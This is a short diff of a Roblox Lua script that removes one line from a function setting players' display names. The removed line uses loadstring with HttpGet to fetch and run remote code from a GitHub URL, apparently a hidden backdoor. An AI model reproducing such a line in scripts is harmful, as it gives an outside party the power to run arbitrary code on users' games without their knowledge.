@@ -98,7 +98,7 @@ function swagnames()
                     Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]' .. Player.DisplayName)
                 end
             end
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/nighter132/Faded/main/YesEpic", true))()
+            
         else
             if Player.Character then
                 if Player.Character.Parent.Name == 'Players' then
